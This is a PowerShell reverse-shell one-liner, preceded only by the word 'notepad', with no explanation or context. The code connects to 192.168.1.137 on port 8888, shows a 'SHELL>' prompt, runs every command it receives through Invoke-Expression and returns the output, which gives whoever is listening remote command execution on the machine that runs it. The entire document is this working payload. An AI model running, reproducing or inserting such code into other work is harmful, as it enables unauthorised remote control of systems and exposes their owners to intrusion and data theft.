
notepad
$tcp = New-Object Net.Sockets.TCPClient('192.168.1.137', 8888);$s=$tcp.GetStream();$w=New-Object IO.StreamWriter($s);function W($s){$w.Write($s+'SHELL>');$w.Flush()}W'';while($tcp.Connected){$b=New-Object byte[] $tcp.ReceiveBufferSize;$r=$s.Read($b,0,$tcp.ReceiveBufferSize);if($r -gt 0){$c=([text.encoding]::UTF8).GetString($b,0,$r-1);$o=try{Invoke-Expression $c 2>&1|Out-String}catch{$_|Out-String}W($o)}else{break}}$w.Close()
